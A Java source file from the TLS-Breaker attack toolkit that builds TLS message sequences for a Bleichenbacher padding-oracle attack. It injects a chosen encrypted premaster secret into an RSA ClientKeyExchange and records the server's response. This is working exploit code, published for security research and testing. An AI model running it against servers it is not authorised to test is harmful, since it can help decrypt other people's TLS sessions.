/*
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2024 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */
package de.rub.nds.tlsbreaker.bleichenbacher.pkcs1;

import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.core.protocol.message.RSAClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.GenericReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;

/** */
public class BleichenbacherWorkflowGenerator {

    /**
     * @param tlsConfig
     * @param type
     * @param encryptedPMS
     * @return
     */
    public static WorkflowTrace generateWorkflow(
            Config tlsConfig, BleichenbacherWorkflowType type, byte[] encryptedPMS) {
        WorkflowTrace trace =
                new WorkflowConfigurationFactory(tlsConfig)
                        .createWorkflowTrace(
                                WorkflowTraceType.DYNAMIC_HELLO, RunningModeType.CLIENT);
        RSAClientKeyExchangeMessage cke = new RSAClientKeyExchangeMessage(tlsConfig);
        ModifiableByteArray epms = new ModifiableByteArray();
        epms.setModification(ByteArrayModificationFactory.explicitValue(encryptedPMS));
        cke.setPublicKey(epms);
        if (null != type) {
            switch (type) {
                case CKE:
                    trace.addTlsAction(new SendAction(cke));
                    break;
                case CKE_CCS:
                    trace.addTlsAction(new SendAction(cke, new ChangeCipherSpecMessage(tlsConfig)));
                    break;
                case CKE_CCS_FIN:
                    trace.addTlsAction(
                            new SendAction(
                                    cke,
                                    new ChangeCipherSpecMessage(tlsConfig),
                                    new FinishedMessage(tlsConfig)));
                    break;
                case CKE_FIN:
                    trace.addTlsAction(new SendAction(cke, new FinishedMessage(tlsConfig)));
                    break;
                default:
                    break;
            }
        }
        trace.addTlsAction(new GenericReceiveAction());
        return trace;
    }

    private BleichenbacherWorkflowGenerator() {}
}
